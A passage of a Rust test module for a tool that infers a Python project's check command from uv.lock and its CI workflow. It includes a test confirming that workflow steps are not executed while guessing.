        assert_eq!(guess.check.as_deref(), Some("uv run --frozen pytest"));
        assert_eq!(guess.from, ["uv.lock"]);
        assert!(guess.ci_checks.is_empty() && guess.ci_left_out.is_empty());
    }

    #[test]
    fn a_saved_check_that_misses_what_ci_runs_is_told_what() {
        let dir = repo(&[
            ("uv.lock", &lock(&["pytest", "ruff", "pyright"])),
            ("pyproject.toml", &dev_group(&["pytest", "ruff", "pyright"])),
            (CI_FILE, PYTHON_CI),
        ]);
        assert_eq!(
            ci_gap(dir.path(), "uv run --frozen pytest"),
            CiGap {
                commands: strings(&[
                    "uv run --frozen ruff check .",
                    "uv run --frozen ruff format --check .",
                    "uv run --frozen pyright",
                ]),
                left_out: Vec::new(),
                from: vec![".github/workflows/ci.yml".to_owned()],
            }
        );
        let whole = "uv run --frozen pytest && uv run --frozen ruff check src && uv run ruff format --check && pyright";
        assert_eq!(ci_gap(dir.path(), whole), CiGap::default());
        assert_eq!(
            ci_gap(repo(&[("uv.lock", "")]).path(), "uv run --frozen pytest"),
            CiGap::default()
        );
        // Without the lock there's no uv setup, so nothing it runs is installed.
        let gap = ci_gap(
            repo(&[(".github/workflows/ci.yml", PYTHON_CI)]).path(),
            "uv run --frozen pytest",
        );
        assert!(gap.commands.is_empty());
        assert_eq!(
            gap.left_out,
            [
                "uv run ruff check .",
                "uv run ruff format --check .",
                "uv run pyright"
            ]
        );
    }

    #[test]
    fn nothing_in_the_workflow_runs_while_guessing() {
        let dir = tempfile::tempdir().unwrap();
        let canary = dir.path().join("ran");
        let workflow = format!(
            "jobs:\n  t:\n    steps:\n      - run: touch {0}\n      - run: touch {0} && ./run-tests.sh\n",
            canary.display()
        );
        std::fs::create_dir_all(dir.path().join(".github/workflows")).unwrap();
        std::fs::write(dir.path().join(".github/workflows/ci.yml"), workflow).unwrap();
        assert!(guess(dir.path()).from_ci);
        assert!(!canary.exists());
    }
}
